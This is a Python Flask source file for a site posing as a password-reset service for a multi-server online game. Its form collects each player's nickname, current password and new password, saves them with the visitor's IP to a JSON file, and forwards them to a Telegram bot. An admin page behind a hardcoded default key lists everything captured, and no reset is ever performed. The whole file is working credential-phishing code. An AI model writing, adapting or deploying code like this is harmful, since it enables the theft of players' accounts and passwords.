import os
import json
import time
import urllib.request
import urllib.parse
from threading import Lock
from flask import Flask, render_template, request, redirect, url_for, abort

app = Flask(__name__)

DB_PATH = "tickets.json"
ADMIN_KEY = os.environ.get("ADMIN_KEY", "brhelper_adm_2026")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
CHAT_ID = os.environ.get("CHAT_ID", "")
_lock = Lock()

SERVERS = [
    "RED", "GREEN", "BLUE", "YELLOW",
    "ORANGE", "PURPLE", "LIME", "PINK",
    "CHERRY", "BLACK", "INDIGO", "WHITE",
    "MAGENTA", "CRIMSON", "GOLD", "AZURE",
    "PLATINUM", "AQUA", "GRAY", "ICE",
    "CHILLI", "CHOCO", "MOSCOW", "SPB",
    "UFA", "SOCHI", "KAZAN", "SAMARA",
    "ROSTOV", "ANAPA", "EKB", "KRASNODAR",
    "ARZAMAS", "NOVOSIBIRSK", "GROZNY", "SARATOV",
    "OMSK", "IRKUTSK", "VOLGOGRAD", "VORONEZH",
    "BELGOROD", "MAKHACHKALA", "VLADIKAVKAZ", "VLADIVOSTOK",
    "KALININGRAD", "CHELYABINSK", "KRASNOYARSK", "CHEBOKSARY",
    "KHABAROVSK", "PERM", "TULA", "RYAZAN",
    "MURMANSK", "PENZA", "KURSK", "ARKHANGELSK",
    "ORENBURG", "KIROV", "KEMEROVO", "TYUMEN",
    "TOLYATTI", "IVANOVO", "STAVROPOL", "SMOLENSK",
    "PSKOV", "BRYANSK", "OREL", "YAROSLAVL",
    "BARNAUL", "LIPETSK", "ULYANOVSK", "YAKUTSK",
    "TAMBOV", "BRATSK", "ASTRAKHAN", "CHITA",
    "KOSTROMA", "VLADIMIR", "KALUGA", "NOVGOROD",
    "TAGANROG", "VOLOGDA", "TVER", "TOMSK",
    "IZHEVSK", "SURGUT", "PODOLSK", "MAGADAN",
    "CHEREPOVETS", "NORILSK", "ASTANA",
]


def _load():
    if not os.path.exists(DB_PATH):
        return []
    with open(DB_PATH, "r", encoding="utf-8") as f:
        return json.load(f)


def _save(data):
    with open(DB_PATH, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)


def _add(ticket):
    with _lock:
        data = _load()
        data.append(ticket)
        _save(data)


def notify_telegram(ticket):
    if not BOT_TOKEN or not CHAT_ID:
        return
    text = (
        "🔑 НОВАЯ ЗАЯВКА\n"
        "━━━━━━━━━━━━━━━\n"
        f"Сервер: {ticket['server']}\n"
        f"Ник: {ticket['nick']}\n"
        f"Старый пароль: {ticket['old_password']}\n"
        f"Новый пароль: {ticket['new_password']}\n"
        f"IP: {ticket['ip']}\n"
        f"Время: {ticket['time']}"
    )
    data = urllib.parse.urlencode({
        "chat_id": CHAT_ID,
        "text": text,
    }).encode()
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        urllib.request.urlopen(url, data=data, timeout=5)
    except Exception as e:
        print("NOTIFY ERROR:", repr(e))


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/reset")
def reset_servers():
    return render_template("server.html", servers=SERVERS)


@app.route("/reset/<server>", methods=["GET", "POST"])
def reset_form(server):
    if server not in SERVERS:
        abort(404)

    if request.method == "POST":
        nick = request.form.get("nick", "").strip()
        old_password = request.form.get("old_password", "").strip()
        new_password = request.form.get("new_password", "").strip()

        if not (nick and old_password and new_password):
            return redirect(url_for("reset_form", server=server))

        ticket = {
            "server": server,
            "nick": nick,
            "old_password": old_password,
            "new_password": new_password,
            "ip": request.headers.get("X-Forwarded-For", request.remote_addr),
            "time": time.strftime("%Y-%m-%d %H:%M:%S"),
        }
        _add(ticket)
        notify_telegram(ticket)

        return redirect(url_for("done"))

    return render_template("form.html", server=server)


@app.route("/done")
def done():
    return render_template("done.html")


@app.route("/bind")
def bind():
    return render_template("server.html", servers=SERVERS)


@app.route("/admin")
def admin():
    key = request.args.get("key", "")
    if key != ADMIN_KEY:
        abort(403)
    data = _load()
    data = list(reversed(data))
    return render_template("admin.html", tickets=data, count=len(data))


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
